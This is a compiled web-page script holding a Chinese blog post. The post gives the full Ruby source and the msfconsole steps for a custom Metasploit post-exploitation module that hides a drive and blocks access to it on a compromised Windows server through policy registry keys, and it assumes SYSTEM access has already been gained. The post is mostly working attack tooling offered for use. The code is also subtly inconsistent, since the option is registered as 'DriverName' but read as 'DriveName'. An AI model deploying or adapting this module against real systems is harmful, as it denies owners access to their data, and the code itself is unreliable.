(window.webpackJsonp=window.webpackJsonp||[]).push([[376],{672:function(s,n,e){"use strict";e.r(n);var a=e(7),t=Object(a.a)({},(function(){var s=this,n=s._self._c;return n("ContentSlotsDistributor",{attrs:{"slot-key":s.$parent.slotKey}},[n("h1",{attrs:{id:"metasploit自定义让磁盘失效的后渗透模块"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#metasploit自定义让磁盘失效的后渗透模块"}},[s._v("#")]),s._v(" Metasploit自定义让磁盘失效的后渗透模块")]),s._v(" "),n("p",[s._v("一个可以禁用Windows 操作系统上的指定硬盘的程序，这里我们将脚本命名为：disable_drives_by_binghe.rb。")]),s._v(" "),n("p",[s._v("具体内容如下：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("##\n# Author 冰河\n# Date 2019-01-12\n# Description 禁用Windows操作系统上的指定硬盘的程序\n##\n\nrequire 'msf/core'\nrequire 'rex'\nrequire 'msf/core/post/windows/registry'\n\nclass Metasploit3 < Msf::Post\n  include Msf::Post::Windows::Registry\n  \n  def initialize\n    super(\n        'Name'        => 'Driver Disabler',\n        'Description' => 'This Modules Hides and Restrict Access to a Drive',\n        'Author'      => 'binghe',\n        'License'     => MSF_LICENSE\n    )\n    register_options(\n    [\n      OptString.new('DriverName', [true, 'Please SET the Drive Letter'])\n    ], self.class)\n    end\n   \n   def run\n    drive_int = drive_string(datastore['DriveName'])\n    key1 = \"HKLM\\\\SoftWare\\\\Microsoft\\\\WIndows\\\\CurrentVersion\\\\Policies\\\\Explorer\"\n    exists = meterpreter_registry_key_exist?(key1)\n    if not exists\n      print_good(\"Hidden Drive\") \n      meterpreter_registry_setvaldata(key1, 'NoDrives', drive_int.to_s, 'REG_DWORD', REGISTRY_VIEW_NATIVE)\n      print_good(\"Restricting Access to the Drive\")\n      meterpreter_registry_setvaldata(key1, 'NoViewOnDrives', drive_int.to_s, 'REG_DWORD',REGISTRY_VIEW_NATIVE)\n    else\n      print_good(\"Key Exist, Skipping and Creating Values\")\n      print_good(\"Hiding Drive\")\n      meterpreter_registry_setvaldata(key1, 'NoDrives', drive_int.to_s, 'REG_DWORD', REGISTRY_VIEW_NATIVE)\n      print_good(\"Restricting Access to the Drive\")\n      meterpreter_registry_setvaldata(key1, 'NoViewOnDrives', drive_int.to_s, 'REG_DWORD',REGISTRY_VIEW_NATIVE)\n     end\n     print_good(\"Disabled #{datastore['DriveName']} Drive\") \n    end\n    \n   def drive_string(drive)\n    case drive\n      when 'A'\n        return 1\n      when 'B'\n        return 2\n      when 'C'\n        return 4\n      when 'D'\n        return 8\n      when 'E'\n        return 16\n       end\n    end \nend\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br"),n("span",{staticClass:"line-number"},[s._v("15")]),n("br"),n("span",{staticClass:"line-number"},[s._v("16")]),n("br"),n("span",{staticClass:"line-number"},[s._v("17")]),n("br"),n("span",{staticClass:"line-number"},[s._v("18")]),n("br"),n("span",{staticClass:"line-number"},[s._v("19")]),n("br"),n("span",{staticClass:"line-number"},[s._v("20")]),n("br"),n("span",{staticClass:"line-number"},[s._v("21")]),n("br"),n("span",{staticClass:"line-number"},[s._v("22")]),n("br"),n("span",{staticClass:"line-number"},[s._v("23")]),n("br"),n("span",{staticClass:"line-number"},[s._v("24")]),n("br"),n("span",{staticClass:"line-number"},[s._v("25")]),n("br"),n("span",{staticClass:"line-number"},[s._v("26")]),n("br"),n("span",{staticClass:"line-number"},[s._v("27")]),n("br"),n("span",{staticClass:"line-number"},[s._v("28")]),n("br"),n("span",{staticClass:"line-number"},[s._v("29")]),n("br"),n("span",{staticClass:"line-number"},[s._v("30")]),n("br"),n("span",{staticClass:"line-number"},[s._v("31")]),n("br"),n("span",{staticClass:"line-number"},[s._v("32")]),n("br"),n("span",{staticClass:"line-number"},[s._v("33")]),n("br"),n("span",{staticClass:"line-number"},[s._v("34")]),n("br"),n("span",{staticClass:"line-number"},[s._v("35")]),n("br"),n("span",{staticClass:"line-number"},[s._v("36")]),n("br"),n("span",{staticClass:"line-number"},[s._v("37")]),n("br"),n("span",{staticClass:"line-number"},[s._v("38")]),n("br"),n("span",{staticClass:"line-number"},[s._v("39")]),n("br"),n("span",{staticClass:"line-number"},[s._v("40")]),n("br"),n("span",{staticClass:"line-number"},[s._v("41")]),n("br"),n("span",{staticClass:"line-number"},[s._v("42")]),n("br"),n("span",{staticClass:"line-number"},[s._v("43")]),n("br"),n("span",{staticClass:"line-number"},[s._v("44")]),n("br"),n("span",{staticClass:"line-number"},[s._v("45")]),n("br"),n("span",{staticClass:"line-number"},[s._v("46")]),n("br"),n("span",{staticClass:"line-number"},[s._v("47")]),n("br"),n("span",{staticClass:"line-number"},[s._v("48")]),n("br"),n("span",{staticClass:"line-number"},[s._v("49")]),n("br"),n("span",{staticClass:"line-number"},[s._v("50")]),n("br"),n("span",{staticClass:"line-number"},[s._v("51")]),n("br"),n("span",{staticClass:"line-number"},[s._v("52")]),n("br"),n("span",{staticClass:"line-number"},[s._v("53")]),n("br"),n("span",{staticClass:"line-number"},[s._v("54")]),n("br"),n("span",{staticClass:"line-number"},[s._v("55")]),n("br"),n("span",{staticClass:"line-number"},[s._v("56")]),n("br"),n("span",{staticClass:"line-number"},[s._v("57")]),n("br"),n("span",{staticClass:"line-number"},[s._v("58")]),n("br"),n("span",{staticClass:"line-number"},[s._v("59")]),n("br"),n("span",{staticClass:"line-number"},[s._v("60")]),n("br")])]),n("p",[n("strong",[s._v("注意：使用此脚本的前提是我们已经经过一系列的渗透拿到了目标Windows服务器的System权限。")])]),s._v(" "),n("p",[s._v("接下来我们将脚本传到Kali的/usr/share/metasploit-framework/modules/post/windows/manage目录下，此时，我们在Kali下操作：")]),s._v(" "),n("div",{staticClass:"language- line-numbers-mode"},[n("pre",{pre:!0,attrs:{class:"language-text"}},[n("code",[s._v("msfconsole\nmsf auxiliary(scanner/ssh/ssh_brute_by_binghe) > use post/windows/manage/disable_drives_by_binghe \nmsf post(windows/manage/disable_drives_by_binghe) > show options\n\nModule options (post/windows/manage/disable_drives_by_binghe):\n\n   Name        Current Setting  Required  Description\n   ----        ---------------  --------  -----------\n   DriverName                   yes       Please SET the Drive Letter\n   SESSION                      yes       The session to run this module on.\n\nmsf post(windows/manage/disable_drives_by_binghe) > set DriverName D\nDriverName => D\nmsf post(windows/manage/disable_drives_by_binghe) > run\n")])]),s._v(" "),n("div",{staticClass:"line-numbers-wrapper"},[n("span",{staticClass:"line-number"},[s._v("1")]),n("br"),n("span",{staticClass:"line-number"},[s._v("2")]),n("br"),n("span",{staticClass:"line-number"},[s._v("3")]),n("br"),n("span",{staticClass:"line-number"},[s._v("4")]),n("br"),n("span",{staticClass:"line-number"},[s._v("5")]),n("br"),n("span",{staticClass:"line-number"},[s._v("6")]),n("br"),n("span",{staticClass:"line-number"},[s._v("7")]),n("br"),n("span",{staticClass:"line-number"},[s._v("8")]),n("br"),n("span",{staticClass:"line-number"},[s._v("9")]),n("br"),n("span",{staticClass:"line-number"},[s._v("10")]),n("br"),n("span",{staticClass:"line-number"},[s._v("11")]),n("br"),n("span",{staticClass:"line-number"},[s._v("12")]),n("br"),n("span",{staticClass:"line-number"},[s._v("13")]),n("br"),n("span",{staticClass:"line-number"},[s._v("14")]),n("br")])]),n("p",[s._v("此时，查看目标服务器的D盘确实被成功禁用了。")]),s._v(" "),n("h2",{attrs:{id:"写在最后"}},[n("a",{staticClass:"header-anchor",attrs:{href:"#写在最后"}},[s._v("#")]),s._v(" 写在最后")]),s._v(" "),n("blockquote",[n("p",[s._v("如果你觉得冰河写的还不错，请微信搜索并关注「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号，跟冰河学习高并发、分布式、微服务、大数据、互联网和云原生技术，「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号更新了大量技术专题，每一篇技术文章干货满满！不少读者已经通过阅读「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号文章，吊打面试官，成功跳槽到大厂；也有不少读者实现了技术上的飞跃，成为公司的技术骨干！如果你也想像他们一样提升自己的能力，实现技术能力的飞跃，进大厂，升职加薪，那就关注「 "),n("strong",[s._v("冰河技术")]),s._v(" 」微信公众号吧，每天更新超硬核技术干货，让你对如何提升技术能力不再迷茫！")])]),s._v(" "),n("p",[n("img",{staticClass:"lazy",attrs:{alt:"","data-src":"https://img-blog.csdnimg.cn/20200906013715889.png",loading:"lazy"}})])])}),[],!1,null,null,null);n.default=t.exports}}]);